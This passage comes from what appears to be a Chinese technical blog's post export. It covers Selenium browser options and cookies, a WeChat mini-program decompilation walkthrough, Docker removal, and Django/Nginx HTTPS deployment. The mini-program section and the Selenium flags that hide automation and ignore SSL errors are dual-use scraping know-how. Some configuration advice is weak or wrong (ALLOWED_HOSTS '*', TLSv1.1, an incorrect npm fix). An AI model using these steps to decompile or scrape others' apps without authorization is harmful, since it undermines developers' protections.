class="string">&quot;User-Agent=user_agent&quot;</span>)</span><br><span class="line"><span class="comment"># 添加crx插件</span></span><br><span class="line">options.add_extension(<span class="string">&quot;d:\crx\AdBlock_v2.17.crx&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止图片</span></span><br><span class="line">options.add_argument(<span class="string">&quot;blink-settings=imagesEnabled=false&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止显示&quot;Chrome 正受到自动测试软件的控制。&quot;</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;useAutomationExtension&quot;</span>, <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 设置开发者模式启动</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&quot;enable-automation&quot;</span>])</span><br><span class="line"><span class="comment"># 设置忽略ssl错误,任何ssl协议</span></span><br><span class="line">options.add_argument(<span class="string">&quot;service_args=[&#x27;–ignore-ssl-errors=true&#x27;, &#x27;–ssl-protocol=any&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止弹窗</span></span><br><span class="line">options.add_experimental_option(</span><br><span class="line">        <span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.default_content_setting_values&quot;</span>: &#123;<span class="string">&quot;notifications&quot;</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 设置用户目录</span></span><br><span class="line">options.add_argument(</span><br><span class="line">        <span class="string">r&quot;--user-data-dir=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># 设置浏览器位置</span></span><br><span class="line">options.binary_location = <span class="string">&quot;browser_path&quot;</span></span><br><span class="line"><span class="comment"># 启动浏览器</span></span><br><span class="line">browser = webdriver.Chrome(executable_path=<span class="string">&quot;driver_path&quot;</span>, chrome_options=options)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No98：Selenium添加Cookie的方法</title>
      <link href="/posts/8276ab56.html"/>
      <url>/posts/8276ab56.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、webdriver中常用的cookie方法"><a href="#一、webdriver中常用的cookie方法" class="headerlink" title="一、webdriver中常用的cookie方法"></a>一、webdriver中常用的cookie方法</h3><p>webdriver中提供了操作cookie的相关方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获得cookie信息</span></span><br><span class="line">get_cookies()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加cookie</span></span><br><span class="line">add_cookie(cookie_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除特定(部分)的cookie</span></span><br><span class="line">delete_cookie(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有的cookie</span></span><br><span class="line">delete_all_cookies()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、add-cookie-的用法"><a href="#二、add-cookie-的用法" class="headerlink" title="二、add_cookie()的用法"></a>二、add_cookie()的用法</h3><p>1.源码中的解释</p><p>源码中简略的向我们展示了如何添加cookie，源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_cookie</span>(<span class="params">self, cookie_dict</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Adds a cookie to your current session.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :Args:</span></span><br><span class="line"><span class="string">     - cookie_dict: A dictionary object, with required keys - &quot;name&quot; and &quot;value&quot;;</span></span><br><span class="line"><span class="string">        optional keys - &quot;path&quot;, &quot;domain&quot;, &quot;secure&quot;, &quot;expiry&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        driver.add_cookie(&#123;&#x27;name&#x27; : &#x27;foo&#x27;, &#x27;value&#x27; : &#x27;bar&#x27;&#125;)</span></span><br><span class="line"><span class="string">        driver.add_cookie(&#123;&#x27;name&#x27; : &#x27;foo&#x27;, &#x27;value&#x27; : &#x27;bar&#x27;, &#x27;path&#x27; : &#x27;/&#x27;&#125;)</span></span><br><span class="line"><span class="string">        driver.add_cookie(&#123;&#x27;name&#x27; : &#x27;foo&#x27;, &#x27;value&#x27; : &#x27;bar&#x27;, &#x27;path&#x27; : &#x27;/&#x27;, &#x27;secure&#x27;:True&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.execute(Command.ADD_COOKIE, &#123;<span class="string">&quot;cookie&quot;</span>: cookie_dict&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从中可以看出add_cookie()这个函数有一个参数cookie_dict，它是以字典的形式传入的，字典中必选的键是”name”和”value”，</p><p>可选的键是”path”,”domin”,”secure”,”expiry”，其实源码中还漏了一个：”httponly”。</p><p>2、cookie中键名的含义</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">name        cookie的名称</span><br><span class="line">value       cookie对应的值，动态生成的</span><br><span class="line">domain      服务器域名</span><br><span class="line">expiry      Cookie有效终止日期</span><br><span class="line">path        Path属性定义了Web服务器上哪些路径下的页面可获取服务器设置的Cookie</span><br><span class="line">httpOnly    防脚本攻击</span><br><span class="line">secure      在Cookie中标记该变量，表明浏览器和服务器之间的通信协议为加密认证协议。</span><br></pre></td></tr></table></figure><h3 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h3><p>1.第一次测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">cookies = &#123;<span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>&#125;</span><br><span class="line">driver.add_cookie(cookie_dict=cookies)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.ketangpai.com/Main/index.html&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果后发现报错了：Message: unable to set cookie。</p><p>解决方案：必须先加载网站，这样Selenium才能知道cookie属于哪个网站。</p><p>2、第二次测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">cookies = &#123;<span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>&#125;</span><br><span class="line">driver.get(<span class="string">&quot;https://www.ketangpai.com/User/login.html&quot;</span>)</span><br><span class="line">driver.add_cookie(cookie_dict=cookies)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.ketangpai.com/Main/index.html&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行成功。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No97：微信小程序逆向流程</title>
      <link href="/posts/2805421f.html"/>
      <url>/posts/2805421f.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h3><ol><li><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker">下载微信小程序反编译工具</a></p></li><li><p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">下载微信开发者工具</a></p></li><li><p>安装node.js</p></li><li><p>一台已root手机或模拟器。</p></li><li><p>微信抓包</p></li></ol><ul><li><p>安卓系统7.0以下版本，不管微信任意版本，都会信任系统提供的证书</p></li><li><p>安卓系统7.0以上版本，微信7.0以下版本，微信会信任系统提供的证书</p></li><li><p>安卓系统7.0以上版本，微信7.0以上版本，微信只信任它自己配置的证书列表</p></li></ul><h3 id="2、提取微信小程序wxapkg包"><a href="#2、提取微信小程序wxapkg包" class="headerlink" title="2、提取微信小程序wxapkg包"></a>2、提取微信小程序wxapkg包</h3><ul><li><p>清空微信所有数据。</p></li><li><p>打开微信，登录微信账号。</p></li><li><p>打开待爬小程序，等到加载完毕正常显示后关闭。</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">从手机上取得wxapkg包</span><br><span class="line">adb pull /data/data/com.tencent.mm/MicroMsg/8f86...(微信标识号)/appbrand/pkg/*.wxapkg</span><br></pre></td></tr></table></figure><h3 id="3、反编译"><a href="#3、反编译" class="headerlink" title="3、反编译"></a>3、反编译</h3><ul><li>反编译</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入工具目录wxappUnpacker，安装node依赖</span></span><br><span class="line">npm install esprima css-tree cssbeautify vm2 uglify-es js-beautify escodegen cheerio</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把取得的.wxapkg文件筛选一下进行反编译</span></span><br><span class="line">node wuWxapkg.js xxx.wxapkg</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">出现File <span class="keyword">done</span>，表示反编译完毕，会生成一个同名的目录。打开这个目录就能看到了。</span></span><br></pre></td></tr></table></figure><ul><li>问题</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">问题一</span></span><br><span class="line">Error: Cannot find module &#x27;uglify-es&#x27;</span><br><span class="line">    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:581:15)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:507:25)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:637:17)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:22:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/whidy/webs/wxappUnpacker/wuJs.js:3:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:689:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:700:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:599:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:538:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:530:3)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原因：没装好依赖</span></span><br><span class="line">npm run uglify-es</span><br></pre></td></tr></table></figure><h3 id="4、查看小程序源码"><a href="#4、查看小程序源码" class="headerlink" title="4、查看小程序源码"></a>4、查看小程序源码</h3><p>打开微信开发者工具，导入反编译出来的文件夹，就会自动加载小程序。</p><p>注意事项：打开详情-&gt;本地设置-&gt;勾选（不校验合法域名、web-view（业务域名）、TLS版本以及HTTPS证书）</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
            <tag> JS逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No96：Docker彻底卸载</title>
      <link href="/posts/11e7984a.html"/>
      <url>/posts/11e7984a.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死所有docker容器</span></span><br><span class="line">docker kill $(docker ps -a -q)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有docker容器</span></span><br><span class="line">docker rm $(docker ps -a -q)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有docker镜像</span></span><br><span class="line">docker rmi $(docker images -q)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止docker服务</span></span><br><span class="line">systemctl stop docker</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除docker相关目录</span></span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /run/docker</span><br><span class="line">rm -rf /var/lib/dockershim</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果删除不掉,则先umount</span></span><br><span class="line">umount /var/lib/docker/devicemapper</span><br></pre></td></tr></table></figure><h3 id="2、卸载工作"><a href="#2、卸载工作" class="headerlink" title="2、卸载工作"></a>2、卸载工作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统已经安装了哪些docker包</span></span><br><span class="line">yum list installed | grep docker</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">containerd.io.x86_64 1.4.12-3.1.el7 @docker-ce-stable</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-ce.x86_64 3:20.10.12-3.el7 @docker-ce-stable</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-ce-cli.x86_64 1:20.10.12-3.el7 @docker-ce-stable</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载相关包</span></span><br><span class="line">yum remove -y containerd.io.x86_64 docker-ce.x86_64 docker-ce-cli.x86_64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看系统已经安装了哪些docker包</span></span><br><span class="line">yum list installed | grep docker</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不再出现相关信息,证明删除成功</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看docker命令</span></span><br><span class="line">docker version</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-bash: /usr/bin/docker: No such file or directory</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No95：Django部署成功项目升级为HTTPS</title>
      <link href="/posts/1dd1d449.html"/>
      <url>/posts/1dd1d449.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、Let’s-Encrypt免费证书"><a href="#一、Let’s-Encrypt免费证书" class="headerlink" title="一、Let’s Encrypt免费证书"></a>一、Let’s Encrypt免费证书</h3><h4 id="1-预先工作"><a href="#1-预先工作" class="headerlink" title="1.预先工作"></a>1.预先工作</h4><p>在创建证书之前，在项目根目录下(manage.py文件所在目录)创建文件夹：&#x2F;.well-know，在该文件夹下创建文件：acme-challenge。</p><h4 id="2-配置Nginx"><a href="#2-配置Nginx" class="headerlink" title="2.配置Nginx"></a>2.配置Nginx</h4><p>编辑配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/nginx/conf.d/addcoder.conf</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name blog.xxx.com;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:11001;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/addcoder/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/addcoder/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/addcoder_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/addcoder_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-重启nginx，以便生效"><a href="#3-重启nginx，以便生效" class="headerlink" title="3.重启nginx，以便生效"></a>3.重启nginx，以便生效</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos7</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu16.04</span></span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h4 id="4-安装certbot"><a href="#4-安装certbot" class="headerlink" title="4.安装certbot"></a>4.安装certbot</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos7</span></span><br><span class="line">yum install -y certbot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu16.04</span></span><br><span class="line">sudo add-apt-repository ppa:certbot/certbot</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install certbot</span><br></pre></td></tr></table></figure><h4 id="5-签发-SSL-证书"><a href="#5-签发-SSL-证书" class="headerlink" title="5.签发 SSL 证书"></a>5.签发 SSL 证书</h4><p>两种生成证书的方式</p><ul><li>andalone</li></ul><p>certbot会启动自带的nginx（如果服务器上已经有nginx或apache运行，需要停止已有的nginx或apache）生成证书。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certbot certonly --standalone -d blog.xxx.com</span><br></pre></td></tr></table></figure><ul><li>webroot(推荐)</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certbot certonly --webroot -w /srv/addcoder -d blog.xxx.com</span><br></pre></td></tr></table></figure><p>-w：指定项目绝对路径。</p><p>-d：指定生成证书域名，不可以直接写IP。</p><p>这条命令的输出类似于这样(Congratulations)为成功。</p><p>证书位置：&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;blog.xxx.com&#x2F;fullchain.pem</p><p>私钥位置：&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;blog.xxx.com&#x2F;privkey.pem</p><h4 id="6-生成前向安全性密钥"><a href="#6-生成前向安全性密钥" class="headerlink" title="6.生成前向安全性密钥"></a>6.生成前向安全性密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/letsencrypt/live</span><br><span class="line">openssl dhparam 2048 -out dhparam.pem</span><br></pre></td></tr></table></figure><h3 id="二、将https配置进Nginx"><a href="#二、将https配置进Nginx" class="headerlink" title="二、将https配置进Nginx"></a>二、将https配置进Nginx</h3><h4 id="1-配置"><a href="#1-配置" class="headerlink" title="1.配置"></a>1.配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置监听端口,开启https,默认端口</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name blog.xxx.com;</span><br><span class="line">    # HTTP请求301永久跳转到HTTPS</span><br><span class="line">    if ($server_port = 80) &#123;</span><br><span class="line">        return 301 https://$server_name$request_uri;</span><br><span class="line">    &#125;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:11001;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/addcoder/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/addcoder/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # session会话的缓存类型和大小</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line">    # ession会话的超时时间</span><br><span class="line">    ssl_session_timeout 10m;</span><br><span class="line">    # 依赖SSLv3和TLSv1协议的服务器密码将优先于客户端密码</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    # 证书位置</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/blog.xxx.com/fullchain.pem;</span><br><span class="line">    # 私钥位置</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/blog.xxx.com/privkey.pem;</span><br><span class="line">    # 前向安全性,DH-Key交换密钥文件位置</span><br><span class="line">    ssl_dhparam /etc/letsencrypt/live/dhparam.pem;</span><br><span class="line">    # PCI DSS支付卡行业安全标准,禁用不安全的SSLv1 2 3,只使用TLS,PCI安全标准委员会规定开启TLS1.0将导致PCI DSS不合规</span><br><span class="line">    ssl_protocols TLSv1.1 TLSv1.2;</span><br><span class="line">    # 需要配置符合PFS规范的加密套件</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!DH:!DHE;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/addcoder_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/addcoder_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-重启nginx，以便生效"><a href="#2-重启nginx，以便生效" class="headerlink" title="2.重启nginx，以便生效"></a>2.重启nginx，以便生效</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos7</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu16.04</span></span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h3 id="三、Let’s-Encrypt-续期"><a href="#三、Let’s-Encrypt-续期" class="headerlink" title="三、Let’s Encrypt 续期"></a>三、Let’s Encrypt 续期</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certbot renew</span><br></pre></td></tr></table></figure><h3 id="四、Let’s-Encrypt自动续期"><a href="#四、Let’s-Encrypt自动续期" class="headerlink" title="四、Let’s Encrypt自动续期"></a>四、Let’s Encrypt自动续期</h3><p>Let’s Encrypt的证书90天就过期了，所以，我们还需要设置自动化更新脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑当前用户的定时作业</span></span><br><span class="line">crontab -e</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加入作业</span></span><br><span class="line">00 12 * * 1 source ~/.bashrc;cd /srv &amp;&amp; certbot renew --deploy-hook &quot;systemctl restart nginx&quot; &gt;&gt; crontab_certbot.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ol><li><p>这里是每周一的12点00分尝试更新证书，如果证书在30天内到期，则会更新证书，否则不会更新</p></li><li><p>–deploy-hook选项表示在更新成功以后才运行重载nginx的命令。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No94：Django部署Linux+uWSGI+Nginx</title>
      <link href="/posts/93608966.html"/>
      <url>/posts/93608966.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、系统配置"><a href="#一、系统配置" class="headerlink" title="一、系统配置"></a>一、系统配置</h3><ul><li>转为root用户以获取权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><ul><li>修改主机名</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname xxx</span><br></pre></td></tr></table></figure><h3 id="二、所需软件安装"><a href="#二、所需软件安装" class="headerlink" title="二、所需软件安装"></a>二、所需软件安装</h3><ol><li><p>Python3.6及以上</p></li><li><p>MySQL5.6及以上</p></li><li><p>Nginx</p></li><li><p>Git</p></li></ol><h3 id="三、安装-创建虚拟环境"><a href="#三、安装-创建虚拟环境" class="headerlink" title="三、安装&amp;创建虚拟环境"></a>三、安装&amp;创建虚拟环境</h3><h3 id="四、项目代码注意事项"><a href="#四、项目代码注意事项" class="headerlink" title="四、项目代码注意事项"></a>四、项目代码注意事项</h3><ul><li>公网访问配置</li></ul><p>在setting.py中修改</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开生产环境</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过公网访问</span></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&#x27;*&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>迁移数据库</li></ul><h3 id="五、安装与配置uwsgi"><a href="#五、安装与配置uwsgi" class="headerlink" title="五、安装与配置uwsgi"></a>五、安装与配置uwsgi</h3><p>nginx是门户,它负责转发,它转发动态请求给uwsgi,然后uwsgi在转给django处理。</p><ul><li>安装uwsgi</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><ul><li>测试是否安装完成并且正常</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uwsgi --version</span><br></pre></td></tr></table></figure><ul><li>配置uwsgi.ini文件</li></ul><p>在项目文件夹与manage.py同级的目录下创建uwsgi.ini，文件内容如下（注意路径）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">uwsgi监听的socket，一会儿配置Nginx会用到</span></span><br><span class="line">socket = 127.0.0.1:11001</span><br><span class="line"><span class="meta prompt_"># </span><span 